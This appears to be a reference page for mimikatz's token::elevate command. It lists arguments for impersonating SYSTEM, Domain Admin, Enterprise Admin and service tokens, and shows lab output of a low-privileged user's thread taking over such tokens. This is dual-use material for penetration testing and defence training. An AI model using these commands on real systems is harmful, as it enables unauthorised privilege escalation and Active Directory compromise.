# elevate

Impersonate a token. By default it will elevate permissions to `NT AUTHORITY\SYSTEM`. It has the following command line arguments:

* `/process`: Impersonate the token of the running process
* `/user`: Impersonate the token of the specified user
* `/admin`: Impersonate a token of builtin local administrators
* `/domainadmin`: Impersonate a token with Domain Admin privileges
* `/enterpriseadmin`: Impersonate a token with Enterprise Admin privileges
* `/localservice`: `NT AUTHORITY\LOCAL SERVICE` token impersonation
* `/networkservice`: `NT AUTHORITY\NETWORK SERVICE` token impersonation

```text
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

752     {0;000003e7} 0 D 44299          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
 -> Impersonated !
 * Process Token : {0;002cfce0} 4 F 62374281    hacklab\m3g9tr0n        S-1-5-21-2725560159-1428537199-2260736313-1730  (13g,24p)       Primary
 * Thread Token  : {0;000003e7} 0 D 62721950    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)
```

```text
mimikatz # token::elevate /domainadmin
Token Id  : 0
User name :
SID name  : hacklab\Domain Admins

4512    {0;0007212c} 2 D 476947         hacklab\Administrator   S-1-5-21-2725560159-1428537199-2260736313-500   (29g,26p)       Primary
 -> Impersonated !
 * Process Token : {0;080fd6c8} 3 F 137701065   hacklab\m3g9tr0n        S-1-5-21-2725560159-1428537199-2260736313-1730
(15g,26p)       Primary
 * Thread Token  : {0;0007212c} 2 D 137785083   hacklab\Administrator   S-1-5-21-2725560159-1428537199-2260736313-500
(29g,26p)       Impersonation (Delegation)
```

